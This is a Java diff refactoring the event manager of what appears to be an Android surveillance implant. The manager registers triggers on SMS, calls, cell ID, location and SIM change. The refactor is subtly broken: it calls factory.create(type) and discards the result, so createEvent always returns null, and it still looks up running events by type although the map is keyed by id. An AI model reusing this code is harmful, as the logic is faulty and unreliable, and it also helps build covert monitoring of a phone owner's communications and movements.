@@ -23,7 +23,7 @@ import com.ht.RCSAndroidGUI.util.Check;
 /**
  * The Class EventManager.
  */
-public class EventManager extends Manager<EventBase, Integer> {
+public class EventManager extends Manager<EventBase, Integer, EventType> {
 	/** The Constant TAG. */
 	private static final String TAG = "EventManager";
 
@@ -40,6 +40,7 @@ public class EventManager extends Manager<EventBase, Integer> {
 			synchronized (EventManager.class) {
 				if (singleton == null) {
 					singleton = new EventManager();
+					singleton.setFactory(new EventFactory());
 				}
 			}
 		}
@@ -55,78 +56,17 @@ public class EventManager extends Manager<EventBase, Integer> {
 	 *            : Agent ID
 	 * @return the requested agent or null in case of error
 	 */
-	private EventBase factory(final EventType type, final int id) {
+	private EventBase createEvent(final EventType type, final EventConf conf) {
 		EventBase e = null;
 
-		if (running.containsKey(id) == true) {
+		if (running.containsKey(conf.getId()) == true) {
 			return (EventBase) running.get(type);
 		}
 
-		switch (type) {
-			case EVENT_TIMER:
-				Log.d("QZ", TAG + " Info: " + "");
-				e = new TimerEvent();
-				break;
-
-			case EVENT_SMS:
-				Log.d("QZ", TAG + " Info: " + "EVENT_SMS");
-				e = new SmsEvent();
-				break;
-
-			case EVENT_CALL:
-				Log.d("QZ", TAG + " Info: " + "EVENT_CALL");
-				e = new CallEvent();
-				break;
-
-			case EVENT_CONNECTION:
-				Log.d("QZ", TAG + " Info: " + "EVENT_CONNECTION");
-				e = new ConnectivityEvent();
-				break;
-
-			case EVENT_PROCESS:
-				Log.d("QZ", TAG + " Info: " + "EVENT_PROCESS");
-				break;
-
-			case EVENT_CELLID:
-				Log.d("QZ", TAG + " Info: " + "EVENT_CELLID");
-				e = new CellIdEvent();
-				break;
-
-			case EVENT_QUOTA:
-				Log.d("QZ", TAG + " Info: " + "EVENT_QUOTA");
-				break;
-
-			case EVENT_SIM_CHANGE:
-				Log.d("QZ", TAG + " Info: " + "EVENT_SIM_CHANGE");
-				break;
-
-			case EVENT_LOCATION:
-				Log.d("QZ", TAG + " Info: " + "EVENT_LOCATION");
-				e = new LocationEvent();
-				break;
-
-			case EVENT_AC:
-				Log.d("QZ", TAG + " Info: " + "EVENT_AC");
-				e = new AcEvent();
-				break;
-
-			case EVENT_BATTERY:
-				Log.d("QZ", TAG + " Info: " + "EVENT_BATTERY");
-				e = new BatteryEvent();
-				break;
-
-			case EVENT_STANDBY:
-				Log.d("QZ", TAG + " Info: " + "EVENT_STANDBY");
-				e = new StandbyEvent();
-				break;
-
-			default:
-				Log.d("QZ", TAG + " Error: " + "Unknown: " + type);
-				break;
-		}
+		factory.create(type);
 
 		if (e != null) {
-			running.put(id, e);
+			running.put(conf.getId(), e);
 		}
 
 		return e;
@@ -161,7 +101,7 @@ public class EventManager extends Manager<EventBase, Integer> {
 			final EventType type = conf.getType();
 			Check.asserts(pairs.getKey() == conf.getId(), "wrong mapping");
 
-			final EventBase e = factory(type, conf.getId());
+			final EventBase e = createEvent(type, conf);
 
 			if (e != null) {
 				e.parse(conf);
